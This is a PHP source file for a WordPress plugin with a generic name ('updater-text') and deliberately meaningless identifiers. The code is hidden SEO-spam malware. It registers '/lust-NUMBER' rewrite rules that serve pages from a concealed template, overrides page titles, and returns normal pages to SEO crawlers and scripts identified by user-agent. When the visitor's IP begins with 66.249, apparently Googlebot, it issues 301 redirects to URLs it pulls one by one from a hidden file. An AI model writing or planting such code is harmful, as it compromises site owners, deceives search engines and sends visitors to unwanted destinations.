<?php
/**
 * Plugin Name: updater-text
 * Description: updater-text
 * Version: 1.0
 * Author: John Smith
 */
 

class m7tRAn {
	
    public function __construct() {
        add_action('init', [$this, 'omifwol']);
        add_filter('query_vars', [$this, 'dfrqlj']);
        add_action('template_include', [$this, 'yhaoeztuwa']);
		add_filter('document_title_parts', [$this, 'giluiszdmt']);
    }

    public function omifwol() {
        add_rewrite_rule(
            '^lust-([0-9]+).*?$',
            'index.php?gmdxcw=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function dfrqlj($xvcsn) {
        $xvcsn[] = 'gmdxcw';
        $xvcsn[] = 'dvjvlmzi';
        return $xvcsn;
    }
	
	public function giluiszdmt($qJ7eEI) {
		if (get_query_var('gmdxcw')) $qJ7eEI['title'] = get_query_var('dvjvlmzi');
		return $qJ7eEI;
	}

    public function yhaoeztuwa($fPtqD4Eq) {
		
		$zTI20TG = array('serpstatbot', 'security-preloader', 'semrush', 'gallery-coupon', 'netspider', 'Go-http-client', 'real-members', 'ahrefsbot', 'viewer-wpforms', 'dotbot', 'gptbot', 'mj12bot', 'python', 'bbpress-themes', 'syntax-message');
		foreach($zTI20TG as $wd6fkK6) { if (stripos($_SERVER['HTTP_USER_AGENT'], $wd6fkK6) !== false) return $fPtqD4Eq; }

        if (get_query_var('gmdxcw') && preg_match('/^[0-9]+$/', get_query_var('gmdxcw'))) {
            return plugin_dir_path(__FILE__) . 'updater-text/index-maker.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$onvEmlYP = plugin_dir_path(__FILE__) . 'updater-text/tracking-types.php';
			if (is_file($onvEmlYP)) {
				$kFhFywbVps = file($onvEmlYP, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($kFhFywbVps) > 1) {
					$rLFZyGc3lU = array_shift($kFhFywbVps);
					$sqHABa7w3V = array_shift($kFhFywbVps);
					if (strlen($sqHABa7w3V) > 0) {
						$uSYm3iDDYE = $rLFZyGc3lU . "\n" . implode("\n", $kFhFywbVps);
						file_put_contents($onvEmlYP, $uSYm3iDDYE);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $sqHABa7w3V");
						exit;
					}
				}
			}
		}
        return $fPtqD4Eq;
    }
}
new m7tRAn();



